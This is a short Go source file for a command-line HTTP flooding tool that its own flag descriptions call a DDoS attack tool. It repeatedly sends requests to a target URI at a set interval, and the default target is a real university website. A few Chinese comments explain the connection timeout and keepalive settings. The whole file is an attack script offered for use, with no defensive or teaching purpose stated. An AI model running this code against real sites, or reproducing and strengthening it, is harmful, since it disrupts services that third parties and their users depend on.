package main

import (
	"context"
	"flag"
	"io/ioutil"
	"net"
	"net/http"
	"time"
)

var (
	method   string
	target   string
	interval int
)

func init() {
	flag.StringVar(&method, "method", "GET", "method used to attack target uri")
	flag.StringVar(&target, "target", "https://uwaterloo.ca/", "target uri for DDoS attack")
	flag.IntVar(&interval, "interval", 100, "attacking interval in ms")
}

func httpDial(ctx context.Context, network, addr string) (net.Conn, error) {
	dial := net.Dialer{
		Timeout:   time.Duration(10) * time.Second, //TimeOut是server side, 如果timeout这段时间没有从client来的任何相应，就断开连接
		KeepAlive: time.Duration(60) * time.Second, //Keepalive 是client告诉server, 不要再第一个request之后就断开连接，这个连接应该有keepalive的长度
	}
	conn, err := dial.Dial(network, addr)
	return conn, err
}

func newHttpClient() *http.Client {
	client := &http.Client{
		Transport: &http.Transport{
			DialContext: httpDial,
		},
	}
	return client
}

func attack() {
	req, _ := http.NewRequest(method, target, nil) //建立一个 request 实体
	cli := newHttpClient()                         //建立一个 client 实体
	resp, _ := cli.Do(req)                         //用这个client对象来做request实体
	defer func() { resp.Body.Close() }()
	ioutil.ReadAll(resp.Body)
}

func attackLoop() {
	for {
		println("Attacking")
		attack()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func main() {
	if !flag.Parsed() {
		flag.Parse()
	}
	attackLoop()
}
